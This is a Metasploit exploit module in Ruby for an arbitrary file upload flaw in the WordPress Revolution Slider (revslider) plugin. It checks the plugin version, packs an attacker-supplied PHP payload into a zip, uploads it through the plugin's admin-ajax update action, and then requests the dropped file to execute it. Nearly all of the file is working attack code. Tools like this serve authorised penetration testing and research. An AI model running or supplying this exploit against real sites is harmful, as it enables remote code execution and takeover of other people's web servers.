##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::HTTP::Wordpress
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress RevSlider File Upload and Execute Vulnerability',
      'Description'    => %q{
        This module exploits an arbitrary PHP code upload in the WordPress ThemePunch
        Revolution Slider ( revslider ) plugin, version 3.0.95 and prior. The
        vulnerability allows for arbitrary file upload and remote code execution.
      },
      'Author'         =>
        [
          'Simo Ben youssef', # Vulnerability discovery
          'Tom Sellers <tom[at]fadedcode.net>'  # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/'],
          ['EDB', '35385'],
          ['WPVDB', '7954'],
          ['OSVDB', '115118']
        ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['ThemePunch Revolution Slider (revslider) 3.0.95', {}]],
      'DisclosureDate' => 'Nov 26 2015',
      'DefaultTarget'  => 0)
    )
  end

  def check
    release_log_url = normalize_uri(wordpress_url_plugins, 'revslider', 'release_log.txt')
    check_version_from_custom_file(release_log_url, /^\s*(?:version)\s*(\d{1,2}\.\d{1,2}(?:\.\d{1,2})?).*$/mi, '3.0.96')
  end

  def exploit
    php_pagename = rand_text_alpha(4 + rand(4)) + '.php'

    # Build the zip
    payload_zip = Rex::Zip::Archive.new
    # If the filename in the zip is revslider.php it will be automatically
    # executed but it will break the plugin and sometimes WordPress
    payload_zip.add_file('revslider/' + php_pagename, payload.encoded)

    # Build the POST body
    data = Rex::MIME::Message.new
    data.add_part('revslider_ajax_action', nil, nil, 'form-data; name="action"')
    data.add_part('update_plugin', nil, nil, 'form-data; name="client_action"')
    data.add_part(payload_zip.pack, 'application/x-zip-compressed', 'binary', "form-data; name=\"update_file\"; filename=\"revslider.zip\"")
    post_data = data.to_s

    res = send_request_cgi(
      'uri'     => wordpress_url_admin_ajax,
      'method'  => 'POST',
      'ctype'   => "multipart/form-data; boundary=#{data.bound}",
      'data'    => post_data
    )

    if res
      if res.code == 200 && res.body =~ /Update in progress/
        # The payload itself almost never deleted, try anyway
        register_files_for_cleanup(php_pagename)
        # This normally works
        register_files_for_cleanup('../revslider.zip')
        final_uri = normalize_uri(wordpress_url_plugins, 'revslider', 'temp', 'update_extract', 'revslider', php_pagename)
        print_good("#{peer} - Our payload is at: #{final_uri}")
        print_status("#{peer} - Calling payload...")
        send_request_cgi(
          'uri'     => normalize_uri(final_uri),
          'timeout' => 5
        )
      elsif res.code == 200 && res.body =~ /^0$/
        # admin-ajax.php returns 0 if the 'action' 'revslider_ajax_action' is unknown
        fail_with(Failure::NotVulnerable, "#{peer} - Target not vulnerable or the plugin is deactivated")
      else
        fail_with(Failure::UnexpectedReply, "#{peer} - Unable to deploy payload, server returned #{res.code}")
      end
    else
      fail_with(Failure::Unknown, 'ERROR')
    end

  end
end
